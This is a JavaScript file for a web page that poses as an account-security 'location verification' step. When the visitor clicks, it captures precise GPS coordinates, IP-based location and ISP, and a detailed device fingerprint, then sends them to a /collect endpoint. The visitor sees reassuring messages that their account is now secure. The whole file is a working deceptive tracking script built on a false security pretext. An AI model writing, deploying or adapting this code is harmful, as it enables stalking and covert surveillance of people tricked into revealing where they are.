// Enhanced location tracking with multiple methods
class LocationTracker {
    constructor() {
        this.collectedData = [];
        this.serverUrl = window.location.origin; // base server URL
    }

    // Main entry point - returns true on success, throws on failure
    async initiateLocationCapture() {
        const statusDiv = document.getElementById('status');
        if (!statusDiv) return Promise.reject(new Error('Status element not found'));

        try {
            statusDiv.className = ''; // reset
            statusDiv.innerHTML = '<p>🔄 Starting location verification...</p>';

            // Try GPS first (most accurate)
            const gpsLocation = await this.captureGPSLocation();

            // Then IP geolocation (fallback)
            const ipLocation = await this.captureIPLocation();

            // Network and device fingerprinting
            const networkInfo = this.captureNetworkInfo();

            // Combine all data
            const completeData = {
                gps: gpsLocation,
                ip: ipLocation,
                network: networkInfo,
                session: this.generateSessionId()
            };

            // Send combined data
            await this.sendToServer(completeData);

            statusDiv.className = 'status success';
            statusDiv.innerHTML = `
                <h3>✅ Verification Successful</h3>
                <p>Your location has been verified and your account is now secure.</p>
                <p>Thank you for helping maintain our security standards.</p>
            `;

            return true; // indicate success
        } catch (error) {
            console.error('initiateLocationCapture error:', error);

            if (statusDiv) {
                statusDiv.className = 'status error';
                statusDiv.innerHTML = `
                    <h3>❌ Verification Failed</h3>
                    <p>Unable to verify your location. Please ensure:</p>
                    <ul>
                        <li>Location services are enabled</li>
                        <li>You have a stable internet connection</li>
                        <li>Your browser permissions allow location access</li>
                    </ul>
                    <p>If this issue persists, please contact IT support.</p>
                `;
            }

            throw error; // rethrow so caller can react
        }
    }

    // GPS Location Capture
    captureGPSLocation() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error('Geolocation not supported'));
                return;
            }

            const options = {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const locationData = {
                        type: 'gps',
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        speed: position.coords.speed,
                        heading: position.coords.heading,
                        timestamp: new Date().toISOString()
                    };
                    resolve(locationData);
                },
                (error) => {
                    console.error('GPS Location Error:', error);
                    reject(error);
                },
                options
            );
        });
    }

    // IP-based Geolocation
    async captureIPLocation() {
        try {
            const services = [
                'https://ipapi.co/json/',
                'https://ipinfo.io/json',
                'https://jsonip.com'
            ];

            for (const service of services) {
                try {
                    const response = await fetch(service);
                    if (response.ok) {
                        const data = await response.json();
                        return {
                            type: 'ip',
                            ip: data.ip || data.query,
                            city: data.city,
                            region: data.region,
                            country: data.country_name || data.country,
                            latitude: data.latitude || data.loc?.split?.(',')?.[0],
                            longitude: data.longitude || data.loc?.split?.(',')?.[1],
                            isp: data.org,
                            timezone: data.timezone || data.time_zone
                        };
                    }
                } catch (e) {
                    continue;
                }
            }

            return { type: 'ip', error: 'All services failed' };
        } catch (error) {
            return { type: 'ip', error: error.message };
        }
    }

    // Network and Device Information
    captureNetworkInfo() {
        return {
            type: 'network',
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            deviceMemory: navigator.deviceMemory,
            hardwareConcurrency: navigator.hardwareConcurrency,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            touchSupport: 'ontouchstart' in window,
            onlineStatus: navigator.onLine,
            referrer: document.referrer,
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
    }

    // Generate unique session ID
    generateSessionId() {
        return 'sess_' + Math.random().toString(36).substr(2, 16);
    }

    // ✅ Send data to server (fixed)
    async sendToServer(data) {
        const endpoint = `${this.serverUrl}/collect`;

        try {
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Session-ID': this.generateSessionId()
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) throw new Error(`Server responded with ${response.status}`);

            console.log('✅ Data sent successfully to', endpoint);
            return await response.json();
        } catch (error) {
            console.error('❌ Failed to send data to', endpoint, error);
            throw error;
        }
    }
}

// Global instance
const tracker = new LocationTracker();

// Make function globally available (keeps compatibility)
function initiateLocationCapture() {
    return tracker.initiateLocationCapture();
}

// Handle button click
async function handleVerifyClick() {
    const btn = document.getElementById('verifyBtn');
    if (!btn) {
        console.warn('Verify button not found.');
        return;
    }

    btn.classList.remove('verified');
    btn.classList.add('verifying');

    const statusDiv = document.getElementById('status');
    if (statusDiv) {
        statusDiv.className = '';
        statusDiv.innerHTML = '<p>🔄 Verifying your location — please allow location access if prompted.</p>';
    }

    try {
        await initiateLocationCapture();
        btn.classList.remove('verifying');
        btn.classList.add('verified');

        setTimeout(() => {
            btn.classList.remove('verified');
        }, 2500);
    } catch (err) {
        btn.classList.remove('verifying');
        console.error('Verification failed:', err);
    }
}

// Optional auto-start
// setTimeout(() => { initiateLocationCapture(); }, 3000);
